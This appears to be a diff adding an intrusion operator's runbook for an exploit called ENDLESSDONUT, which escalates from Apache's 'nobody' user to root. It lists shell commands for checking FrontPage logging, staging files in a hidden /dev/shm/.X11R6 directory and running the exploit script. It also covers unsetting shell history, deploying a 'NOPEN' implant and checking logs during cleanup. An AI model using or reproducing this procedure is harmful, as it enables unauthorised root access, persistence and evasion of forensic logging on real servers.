@@ -1,0 +1,63 @@
+
+2011-02-17 14:45:10 EST 
+
+ENDLESSDONUT
+
+
+mx
+:syntax on
+:%s#LOCATION_FOR_APACHE#/usr/local/apache#g
+:%s#WORKING_DIRECTORY#/dev/shm/.X11R6#g
+'x
+
+##  This script assumes that you have connected to your target using some 
+## remote exploitation technique (probably ELEGANTEAGLE) and have an interactive 
+## shell as user "nobody".
+
+##  First, do what we can to see if we will be logged when we attempt to 
+## run the exploit.  Because we are user "nobody" we may not be able to
+## see all of the applicable files at this time, and this is to be expected:
+
+grep -r "FPScriptLog" LOCATION_FOR_APACHE/conf
+grep -r "FPScriptLog" LOCATION_FOR_APACHE/etc
+
+##  Verify that you can execute from the partition you're on, and have a python 
+## interpreter.  You'll probably need to be in /dev/shm or some other location 
+## than /tmp.
+
+which python
+pwd; ls -la
+mount
+mkdir WORKING_DIRECTORY && cd WORKING_DIRECTORY ; pwd
+
+# Verify that there are two root httpd processes running
+
+ps -ef | grep httpd | grep root
+
+##  Use the method of your choice to put the python script on target
+## and make it executable.
+
+#Local: uudecode.pastable -s /current/up/endlessdonut.py e.py
+chmod 700 e.py; ls -la e.py
+
+##  Get timestamps before and after your attempt.
+## "-s" will give us an elevated shell:
+w; id
+python e.py -s
+unset HISTFILE HISTSIZE HISTFILESIZE
+w; id
+
+##  Your id should now look something like this:
+######## uid=99(nobody) gid=99(nobody) euid=0(root) groups=99(nobody)
+##  Put up/run your NOPEN.
+
+## Cleanup:
+##  In addition to the typical -logs/-find procedures, check these (or
+##  the equivalent, if log locations differ on your target):
+
+grep -r "FPScriptLog" LOCATION_FOR_APACHE/conf
+grep -r "FPScriptLog" LOCATION_FOR_APACHE/etc
+-tail -100 LOCATION_FOR_APACHE/logs/error_log
+
+##  If the privilege escalation was successful and generated no errors
+## then there should be no logging.
